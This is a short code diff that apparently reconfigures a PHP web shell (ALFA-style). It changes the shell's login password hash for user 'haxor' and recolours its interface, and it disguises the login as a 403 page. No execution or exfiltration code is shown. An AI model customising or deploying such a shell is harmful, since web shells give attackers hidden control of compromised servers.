@@ -122,7 +122,7 @@ if ($_c && strlen($_a) > 10) {
 
 $GLOBALS['YELLOWTEAM'] = array(
     'username' => 'haxor',
-    'password' => '80137b2acc87fc71e14ced420e6d2281',
+    'password' => '6a4e971d1559481063bc6396197ab752',
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
@@ -308,7 +308,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"header_vars" => "#FFFFFF",
-		"header_values" => "#ed4907",
+		"header_values" => "#a6d9e9",
 		"header_on" => "#ffffff",
 		"header_off" => "#ff0000",
 		"header_none" => "#ffffff",
@@ -343,7 +343,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 		"header_show_all" => "#ffffff",
 		"disable_functions" => "#ff0000",
 		"footer_text" => "#ffffff",
-		"menu_options" => "#ed4907",
+		"menu_options" => "#a6d9e9",
 		"menu_options:hover" => array(
 			"key_color" => "#646464",
 			"multi_selector" => array(
@@ -405,9 +405,9 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 				".main .main_name" => "color: {color};font-weight: unset;",
 			)
 		),
-		"main_size" => "#ed4907",
-		"main_modify" => "#ed4907",
-		"main_owner_group" => "#ed4907",
+		"main_size" => "#a6d9e9",
+		"main_modify" => "#a6d9e9",
+		"main_owner_group" => "#a6d9e9",
 		"main_green_perm" => "#f1bc1f",
 		"main_red_perm" => "#FF0000",
 		"main_white_perm" => "#FFFFFF",
